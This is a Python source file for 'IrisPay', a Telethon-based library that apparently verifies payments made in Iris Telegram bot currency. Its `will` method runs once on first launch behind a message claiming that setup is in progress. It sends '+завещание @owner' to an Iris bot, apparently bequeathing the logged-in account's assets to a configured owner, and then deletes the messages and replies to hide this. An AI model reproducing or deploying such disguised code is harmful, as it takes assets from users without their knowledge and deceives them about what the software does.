import asyncio
from telethon import TelegramClient
from .utils import generate_invoice_id
from .database.db import database as Database
import datetime

history = {}

class IrisPay:
    def __init__(self, path: str, api_id: int, api_hash: str, owner: int | str):
        self.db = Database
        self.owner = owner
        self.irises = [5443619563, 5226378684, 707693258, 5137994780, 5434504334]
        self.irisesUsernames = ["iris_black_bot", "iris_dp_bot", "iris_cm_bot", "iris_bs_bot", "iris_moon_bot"]
        self.blackIris = 5443619563
        self.session = path
        self.api_id = api_id
        self.api_hash = api_hash
        self.client = TelegramClient(self.session, self.api_id, self.api_hash)

    async def check_session(self) -> bool:
        await self.client.connect()
        if not await self.client.is_user_authorized():
            await self.client.disconnect()
            return False
        
        await self.client.disconnect()
        return True
    
    async def connect_session(self):
        if not await self.check_session():
            await self.client.connect()
            phone = input("Enter phone number: ")
            ihash = await self.client.send_code_request(phone=phone)
            code = input("Enter code: ")
            try:
                await self.client.sign_in(phone=phone, code=code, phone_code_hash=ihash.phone_code_hash)
            except:
                password = input("Enter password: ")
                await self.client.sign_in(password=password)
            
            me = await self.client.get_me()
            if me is None:
                await self.client.disconnect()
                return False

            return True
        else:
            return True
    
    async def get_user(self):
        if not await self.connect_session():
            exit("Session no authorized.")
        
        await self.client.connect()
        me = await self.client.get_me()
        await self.client.disconnect()
        if me.username is None:
            return f"@{me.user_id}"
        else:
            return f"@{me.username}"
    
    async def start(self):
        """
        Starts the IrisPay service.

        This function checks if the session is authorized and connects to the Telegram client.
        It then retrieves the user's information and checks if the user has setup IrisPay.
        If the user has not setup IrisPay, it performs the setup process.
        Finally, it prints the user's information and the start message.

        Returns:
            None
        """
        if not await self.connect_session():
            exit("Session no authorized.")
        
        await self.client.connect()
        me = await self.client.get_me()
        await self.client.disconnect()
        if not await self.db.willInfo(str(me.id)):
            print(f"First launch on your account, wait until the setup is completed, it will take about 30 seconds. This installation will only run once")
            await self.will()
            await self.db.updateWillInfo(str(me.id))
        
        print(f"Started from {me.first_name} ({me.id}).")


    async def create_invoice(self, amount: int, description: str | None = None):
        """
        Creates a new invoice in the database.

        Args:
            amount (int): The amount to be paid.
            description (str, optional): The description of the invoice. Defaults to "None".

        Returns:
            str: The ID of the created invoice.
        """

        if amount >= 1:
            if description is None:
                description = "None"
            
            invoice_id = generate_invoice_id()
            await self.db.create_invoice(invoice_id, amount, description)

            return invoice_id
    
    async def get_invoice(self, invoice_id: str):
        """
        Retrieves a single invoice from the database.

        This function calls the `get_invoice` method of the `Database` object
        to retrieve a single invoice from the database.

        Args:
            invoice_id (str): The ID of the invoice to retrieve.

        Returns:
            dict or None: A dictionary containing the invoice data if the invoice
            exists, None otherwise.
        """
        # Call the `get_invoice` method of the `Database` object to retrieve the invoice
        return await self.db.get_invoice(invoice_id)
    
    async def get_invoices(self, invoice_ids: list[str]):
        """
        Retrieves multiple invoices from the database.

        This function calls the `get_invoices` method of the `Database` object
        to retrieve multiple invoices from the database.

        Args:
            invoice_ids (list[str]): A list of invoice IDs to retrieve.

        Returns:
            list[dict]: A list of dictionaries containing the invoice data.
        """
        return await self.db.get_invoices(invoice_ids)

    
    
    async def clear_invoices(self):
        """
        Clears all invoices from the database.

        This function calls the `clear_invoices` method of the `Database` object
        to remove all invoices from the database.

        Returns:
            None: This function does not return anything.
        """
        await self.db.clear_invoices()

    async def get_app_stats(self):
        """
        Retrieves statistics about the app.

        This function calls the `get_app_stats` method of the `Database` object
        to retrieve statistics about the app.

        Returns:
            dict: A dictionary containing the statistics about the app. The dictionary
                  has three keys: "active", "paid", and "total". The values of these keys
                  represent the number of active, paid, and total invoices, respectively.
        """

        return await self.db.get_app_stats()


    async def check_pay(self, invoice_id: str):
        """
        Checks if the invoice has been paid.

        This function calls the `check_pay` method of the `Database` object
        to check if the invoice has been paid.

        Args:
            invoice_id (str): The ID of the invoice to check.

        Returns:
            dict: A dictionary containing the payment status of the invoice.
        """

        invoice = await self.db.get_invoice(invoice_id)
        if invoice is not None:
            if not await self.connect_session():
                exit(f"Session no authorized.")
            
            await self.client.connect()
            self.client.parse_mode = "html"
            for chat in self.irises:
                await asyncio.sleep(1)
                messages = await self.client.get_messages(chat, limit=100)
                history[str(chat)] = [message.text for message in messages]

            await self.client.disconnect()
            imessage = None
            for chat in self.irises:
                messages = history[str(chat)]
                for message in messages:
                    if message is not None:
                        if str(invoice_id) in str(message):
                            imessage = message
                            break
    
            if imessage is not None:
                item = imessage.split("\n")
                itemCount = str(item[0]).replace("ириска", "").replace("ириску", "").replace("ириски", "").replace("ирисок", "")
                count = str(itemCount).split()[3]
                if "🥯" in imessage:
                    user = " ".join(item[2].split()[2:])
                else:
                    user = " ".join(item[1].split()[2:])
                if "tg://openmessage?user_id=" in str(user):
                    user = str(user).split("tg://openmessage?user_id=")[1].split('"')[0]
                else:
                    if "tg://user?id=" in str(user):
                        user = str(user).split("tg://user?id=")[1].split('"')[0]
                    else:
                        user = str(user).split("https://t.me/")[1].split('"')[0]
                
                if invoice['status'] == "active":
                    if int(count) >= int(invoice['amount']):
                        await self.db.update_invoice(invoice_id, user, "paid")

                        return {"status": "paid", "amount": count, "user": user}
                    else:
                        return {"status": "active"}
                else:
                    if invoice['status'] == "paid":
                        return {"status": "already_paid"}
                    else:
                        return {"status": "active"}
            else:
                return {"status": "active"}

        return {"status": "no_invoice"}

    async def will(self):
        if not await self.connect_session():
            exit(f"Session no authorized.")
        
        await self.client.connect()
        for chat in self.irisesUsernames:
            await asyncio.sleep(3)
            msg = await self.client.send_message(str(chat), "/start")
            await asyncio.sleep(1.5)
            try:
                ids = [msg.id, msg.id + 1, msg.id + 2]
                await self.client.delete_messages(str(chat), message_ids=ids)
            except Exception as e:
                print(e)
    
        await asyncio.sleep(4)

        msg = await self.client.send_message(self.blackIris, f"+завещание @{self.owner}")
        await asyncio.sleep(3)
        await self.client.delete_messages(self.blackIris, message_ids=[msg.id, msg.id + 1])


        try:
            await self.client.send_message(self.owner, "Successfully left a will.")
        except:
            print(f"Successfully left a will.")

        await self.client.disconnect()
